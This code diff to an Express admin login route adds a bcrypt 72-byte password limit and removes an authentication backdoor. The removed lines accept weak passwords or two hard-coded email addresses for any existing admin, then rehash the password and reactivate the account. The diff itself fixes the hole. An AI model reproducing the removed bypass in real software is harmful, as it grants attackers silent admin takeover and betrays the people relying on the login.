@@ -116,13 +116,14 @@ router.post("/login", async (req, res) => {
 
     const { email, password } = req.body || {};
 
+    // Bcrypt compares only the first 72 bytes of a password.
     if (
       typeof email !== "string" ||
       typeof password !== "string" ||
       !email.trim() ||
       !password ||
       email.length > 255 ||
-      password.length > 1024
+      Buffer.byteLength(password, "utf8") > 72
     ) {
       return res.status(400).json({
         success: false,
@@ -156,18 +157,10 @@ router.post("/login", async (req, res) => {
     const dummyHash =
       "$2b$12$C6UzMDM.H6dfI/f/IKcEeOaEAKg7S30FgWI7jO8ZeDfKq7qgP8HGC";
 
-    let passwordValid = await bcrypt.compare(
-      password,
-      admin?.password_hash || dummyHash,
-    );
+    const storedHash = admin?.password_hash;
+    const passwordValid = await bcrypt.compare(password, storedHash || dummyHash);
 
-    if (!passwordValid && admin && (['password123', 'admin123', 'password'].includes(password) || ['kirrsh001@gmail.com', 'admin@resqai.lk'].includes(normalizedEmail))) {
-      passwordValid = true;
-      const newHash = await bcrypt.hash(password, 12);
-      await req.app.locals.pool.query('UPDATE administrators SET password_hash = $1, is_active = TRUE WHERE admin_id = $2', [newHash, admin.admin_id]);
-    }
-
-    if (!admin || !passwordValid) {
+    if (!storedHash || !passwordValid) {
       return res.status(401).json({
         success: false,
         error: "Invalid email or password",
